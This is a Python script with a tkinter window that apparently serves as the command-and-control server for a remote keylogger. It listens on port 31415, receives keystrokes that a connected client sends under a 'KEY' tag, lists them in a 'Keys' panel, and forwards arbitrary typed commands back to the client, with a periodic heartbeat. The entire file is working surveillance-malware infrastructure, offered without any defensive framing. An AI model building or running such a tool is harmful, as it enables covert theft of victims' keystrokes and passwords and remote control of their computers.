from tkinter import *
import socket
import sys
import _thread
import time
from collections import deque




server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  


IP = socket.gethostbyname(socket.gethostname())
PORT = 31415

server.bind((IP, PORT))
server.listen(1)

KEY = 'KEY'
CHECK_TIME = 5 #how many seconds to check if the client is still there

keys = deque()


def cthread(con, ad):
    

    while True:
        try:
            message = con.recv(2048) #cliwnt sent message
            if message:
                message = str(message)[2:-1] #get the bytes out
                message_pieces = message.split('|')
                for i in message_pieces:
                    if i.startswith(KEY):
                        
                        print(i[4:])
                        temp_key = i[4:]
                        if temp_key[0] == "'":
                            temp_key  = temp_key[1:]
                        if temp_key[-1] == "'":
                            temp_key = temp_key[:-1]
                        #add the key to the queue
                        keys.append(temp_key)


                    elif i:
                        print(i)
            else:
                pass
        except:
            continue


class thing(Tk):
    def __init__(self, server, *args, **kwargs):
        self.server = server
        super().__init__(*args, **kwargs)

        self.client = 0
        self.ad = 0

        Label(self, text='Keys').grid()
        self.keys = Listbox(self)
        self.keys.grid(row=1, column=0)
        self.keys_scroll = Scrollbar(self, command=self.keys.yview)
        self.auto_scroll_var = IntVar()
        self.auto_scroll = Checkbutton(self, variable=self.auto_scroll_var,
                                       onvalue=1, offvalue=0,
                                       text='Auto Scroll')
        self.auto_scroll.grid(row=0, column=1)
        self.keys_scroll.grid(row=1, column=1, sticky='NSW')
        self.keys.config(yscrollcommand=self.keys_scroll.set)
        
        Label(self, text='Send Command').grid(row=2, column=0)
        self.entry = Entry(self)
        self.entry.grid()

        self.entry.bind('<Return>', self.send)

    def send(self, event=None, message=None):
        if message:
            thing_to_send = message #python did stuff should not be printe
        else:
            thing_to_send = self.entry.get()
            print(thing_to_send) #user inputted stuff
            
        try:
            self.client.send(bytes(thing_to_send, 'utf-8'))
        except:
            self.client = 0
            print('Client disconnected' + self.ad[0])
            self.ad = 0
            return False
        self.entry.delete(0, END)
        return True

    def log_key(self, key):
        replace = {
            '\\\\\\\\': '\\',
            'shift': 'shift_l',
        }
        
        self.keys.insert(END, key) #doesn't work because of different thread
        self.update()
        if self.auto_scroll_var.get():
            self.keys.yview(END)
        

    def main(self):
        while True:
            print('trying to accept')
            con, ad = server.accept() 
            print('accepted at ' + str(ad[0]))
            self.title(str(ad[0]))

            last_checked = time.time() #checks if client is there once every
                                       #CHECK_TIME seconds
            
            self.client = con
            self.ad = ad
            _thread.start_new_thread(cthread, (con, ad))

            while True:
                self.update()
                try:
                    key = keys.pop()
                    self.log_key(key)
                except IndexError:
                    #nothing in the keys queue
                    pass

                if time.time() > last_checked + CHECK_TIME:
                    last_checked = time.time()
                    self.send(message='ALIVE')

                
                if not self.client:
                    break

            
window = thing(server)

window.main()


